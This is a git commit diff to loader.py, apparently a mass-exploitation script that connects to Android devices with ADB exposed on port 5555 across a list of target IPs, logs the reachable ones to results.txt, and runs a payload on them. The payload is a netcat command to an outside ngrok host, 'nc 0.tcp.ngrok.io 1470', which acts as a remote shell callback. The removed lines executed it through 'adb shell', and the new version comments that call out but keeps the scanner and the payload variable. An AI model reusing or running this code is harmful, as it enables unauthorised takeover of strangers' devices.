7343e0d59f463179f4cb6d7ae1c3e5359f33e0bc
unab0mber666 <104841845+unab0mber666@users.noreply.github.com>
2022-05-03 20:05:01 +0200

    Update loader.py
    Adding some minor tweaks for performance, efficiency, and code-quality.

--- loader.py
+++ loader.py
@@ -1,5 +1,6 @@
 import sys
 import subprocess
+import time
 
 payload = "nc 0.tcp.ngrok.io 1470" # Edit this!
 
@@ -20,17 +21,21 @@ banner = """
 """
 
 def scan(line):
-    subprocess.call("adb start-server", shell=True)
-    subprocess.call(f"adb connect {line}:5555", shell=True)
-        
-    output = subprocess.Popen(["adb", "devices"], stdout=subprocess.PIPE).communicate()[0]
-    if 'offline' not in str(output):
-        print(f"Online! -> {line}")
-    subprocess.call("adb kill-server", shell=True)
-    subprocess.call(f"adb shell {payload}", shell=True)
-    
-    save_data = open("results.txt", "a")
-    save_data.write(f"{line}")
+    connection = subprocess.Popen(["adb", "connect", f"{line.strip()}:5555"], stdout=subprocess.PIPE).communicate()[0]
+
+    if 'connected' in str(connection):
+        time.sleep(2)
+
+        state = subprocess.Popen(["adb", "get-state"], stdout=subprocess.PIPE).communicate()[0]
+
+        if 'device' in str(state):
+            print(f"Online! -> {line.strip()}")
+            save_data = open("results.txt", "a")
+            save_data.write(f"{line.strip()}")
+
+    done = subprocess.Popen(["adb", "disconnect"], stdout=subprocess.PIPE).communicate()[0]
+    time.sleep(2)
+    #subprocess.call(f"adb shell {payload}", shell=True)
 
 def get_data(targets):
     devices_list = open(targets, "r")
